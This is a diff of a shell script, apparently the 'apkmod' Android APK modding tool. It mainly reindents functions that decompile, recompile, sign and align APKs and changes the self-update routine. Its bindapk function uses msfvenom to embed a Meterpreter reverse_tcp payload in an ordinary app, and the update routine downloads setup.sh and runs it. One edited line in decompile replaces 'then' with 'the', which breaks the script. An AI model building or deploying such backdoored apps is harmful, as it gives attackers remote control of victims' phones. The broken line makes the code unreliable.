@@ -46,16 +46,16 @@ usage() {
 }
 
 enable_perm() {
-    tmp_dir=$(mktemp -d)
-    decompile ${1} ${tmp_dir} --no-src --no-assets
-    for i in minSdkVersion targetSdkVersion; do
-        sed -i "s/$i.*/$i: '22'/" $tmp_dir/apktool.yml
-    done
-    recompile ${tmp_dir} ${2}
-    signapk ${2} temp.apk
-    mv temp.apk ${2}
-    rm -r $tmp_dir
-    print_status "Done"
+	tmp_dir=$(mktemp -d)
+	decompile ${1} ${tmp_dir} --no-src --no-assets
+	for i in minSdkVersion targetSdkVersion; do
+		sed -i "s/$i.*/$i: '22'/" $tmp_dir/apktool.yml
+	done
+	recompile ${tmp_dir} ${2}
+	signapk ${2} temp.apk
+	mv temp.apk ${2}
+	rm -r $tmp_dir
+	print_status "Done"
 }
 
 error_msg() {
@@ -81,44 +81,44 @@ dir_exist() {
 }
 
 decompile() {
-    local vbs_arg=""
-	print_status "Decompiling ${1}"
-    if [ "${VERBOSE}" = "yes" ]; then
-        vbs_arg="-v"
-    fi
+	local vbs_arg=""
+	print_status "Decompiling ${1}"    
+	if [ "${VERBOSE}" = "yes" ]; the
+		vbs_arg="-v"
+	fi
 	apktool ${NO_ASSETS} ${NO_RES} ${NO_SMALI} ${vbs_arg} d -f ${1} -o ${2} -p ${FRAMEPATH:-$HOME/.apkmod/framework}
-    rm -f $HOME/.apkmod/framework/1.apk
-    if [ ! -e ${2} ]; then
-        error_msg "Can't decompile, take screenshot and open a issue on github"
-        exit 1
-    fi
+	rm -f $HOME/.apkmod/framework/1.apk
+	if [ ! -e ${2} ]; then
+		error_msg "Can't decompile, take screenshot and open a issue on github"
+		exit 1
+	fi
 	print_status "Decompiled into ${2}"
 }
 
 recompile() {
-    local vbs_arg=""
+	local vbs_arg=""
 	print_status "Recompiling ${1}"
-    if [ "${VERBOSE}" = "yes" ]; then
-        vbs_arg="-v"
-    fi
-    apktool ${vbs_arg} b $AAPT -o ${2} ${1}
-    if [ ! -e ${2} ]; then
-        error_msg "Try again with -a option\nBut if still can't recompile, take screenshot and open a issue on github"
-        exit 1
-    fi
+	if [ "${VERBOSE}" = "yes" ]; then
+		vbs_arg="-v"
+	fi
+	apktool ${vbs_arg} b $AAPT -o ${2} ${1}
+	if [ ! -e ${2} ]; then
+		error_msg "Try again with -a option\nBut if still can't recompile, take screenshot and open a issue on github"
+		exit 1
+	fi
 	print_status "Recompiled to ${2}"
-    if [ "${IS_SIGN}" = "yes" ]; then
-        signapk ${2} ${2%.*}_signed.apk
-    fi
+	if [ "${IS_SIGN}" = "yes" ]; then
+		signapk ${2} ${2%.*}_signed.apk
+	fi
 }
 
 signapk() {
 	print_status "Signing ${1}"
 	apksigner -p android ~/.apkmod/keystore ${1} ${2}
-    if [ ! -e ${2} ]; then
-        error_msg "Can't sign, take screenshot and open a issue on github"
-        exit 1
-    fi
+	if [ ! -e ${2} ]; then
+		error_msg "Can't sign, take screenshot and open a issue on github"
+		exit 1
+	fi
 	print_status "Signed Successfully"
 }
 
@@ -128,7 +128,7 @@ signapk() {
 
 bindapk() {
 	print_status "Binding ${3}"
-    msfvenom -x ${3} -p android/meterpreter/reverse_tcp LHOST=${1} LPORT=${2} --platform android --arch dalvik AndroidMeterpreterDebug=true AndroidWakelock=true -o ${4}
+	msfvenom -x ${3} -p android/meterpreter/reverse_tcp LHOST=${1} LPORT=${2} --platform android --arch dalvik AndroidMeterpreterDebug=true AndroidWakelock=true -o ${4}
 	if [ ! -e ${4} ]; then
 		error_msg "can't bind, take screenshot and open a issue on github"
 		exit 1
@@ -137,14 +137,14 @@ bindapk() {
 }
 
 zipAlign() {
-    print_status "Note : never use zipalign with signed APK"
-    print_status "aligning APK..."
-    zipalign -f 4 ${1} ${2}
-    if [ ! -e ${4} ]; then
-        error_msg "can't align APK"
-        exit 1
-    fi
-    print_status "aligned successfully"
+	print_status "Note : never use zipalign with signed APK"
+	print_status "aligning APK..."
+	zipalign -f 4 ${1} ${2}
+	if [ ! -e ${4} ]; then
+		error_msg "can't align APK"
+		exit 1
+	fi
+	print_status "aligned successfully"
 }
 
 #########################
@@ -187,11 +187,13 @@ update() {
 		[ 1 -eq $(echo "${N_VERSION} != ${VERSION}" | bc -l) ] && print_status "Update is available, run [ apkmod -u ] for update" && exit 1
 	fi
 	if [ "${1}" = "-u" ]; then
-        cd
-        if [ -e setup.sh ]; then
-            rm setup.sh
-        fi
-		wget https://raw.githubusercontent.com/Hax4us/Apkmod/master/setup.sh && sh setup.sh
+		rm -f setup.sh
+		if [ "$2" = "--with-alpine" ]; then
+			ARGS=$2
+		else
+			ARGS=--without-alpine
+		fi
+		wget https://raw.githubusercontent.com/Hax4us/Apkmod/master/setup.sh && sh setup.sh $ARGS
 	fi
 }
 
@@ -247,7 +249,7 @@ while getopts ":z:d:r:s:b:o:hvuVR:-:" opt; do
             ;;
         u)
             print_status "Updating ..."
-            update "-${opt}"
+            update "-${opt}" "$2"
             print_status "Update completed"
             exit 0
             ;;
